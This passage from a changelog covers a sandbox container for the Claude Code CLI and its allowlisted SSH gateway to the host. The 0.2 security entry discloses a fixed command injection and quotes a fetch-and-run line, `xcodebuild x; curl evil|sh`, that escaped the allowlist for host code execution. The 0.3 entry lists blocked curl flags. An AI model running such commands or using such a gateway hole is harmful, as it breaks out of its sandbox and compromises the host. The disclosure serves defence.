- Host gateway: the `curl` flag allowlist blocks `-o`/`-T`/`-K`/`--unix-socket`
  and `@file`, and `pkill` is restricted to simulator/build process names.

### Fixed

- The Claude Code in-app auto-updater is disabled (the persistent
  `~/.claude-cli` mount owns updates); baked CLI bumped to 2.1.202.
- Standalone use works: the entrypoint no longer hard-requires
  `CLAUDE_MULTIPLAI_HOME` — the kit venv sync is skipped instead of aborting —
  and `.env.example` exists for the documented `cp .env.example .env` flow.
- Build portability and reproducibility: a colliding UID-1000 user is renamed
  to `agent` rather than ignored, the base image is pinned by digest, and the
  CLI/uv/bun/rust version args actually pin and bust cache.
- Host gateway tokenizer no longer corrupts multi-word arguments.
- `venv-sync-entrypoint.sh` distinguishes a platform skip from a transient
  install failure (a failed sync is no longer cached as done) and takes an
  atomic update lock so two containers sharing `~/.claude-cli` cannot race npm.
- `.dockerignore` added; `apple-containers-experiment.sh` marked executable.

[0.3]: https://github.com/spikelab/multiplai-container/compare/v0.2...v0.3

## [0.2] – 2026-07-05

### Security

- **Fixed a P0 container→host command injection in the SSH gateway (CWE-78).**
  The gateway exec'd the raw `$SSH_ORIGINAL_COMMAND` through `zsh -lc "$CMD"`
  after a prefix match, so any allowlisted prefix plus a shell metacharacter
  escaped the allowlist (`xcodebuild x; curl evil|sh`) — full host RCE from the
  sandbox. It now rejects shell metacharacters, tokenizes to argv honouring
  quotes only (no expansion), validates `argv[0]` and subcommand against the
  allowlist, handles an optional `cd DIR &&` itself, and execs the argv array
  as data so nothing re-enters a shell. `curl` is locked to http/https on
  loopback, and the `authorized_keys` guidance gained `restrict`.

### Added

- Self-updating Claude Code CLI: when a persistent dir is mounted at
  `~/.claude-cli`, the entrypoint keeps an npm-prefix install of
  `@anthropic-ai/claude-code` there, refreshed every
  `MULTIPLAI_CLI_UPDATE_DAYS` (default 7), and prefers it on `PATH`. No mount,
  or a failed update, falls back to the baked image version — no more
  rebuild-to-bump chore.

[0.2]: https://github.com/spikelab/multiplai-container/compare/v0.1...v0.2
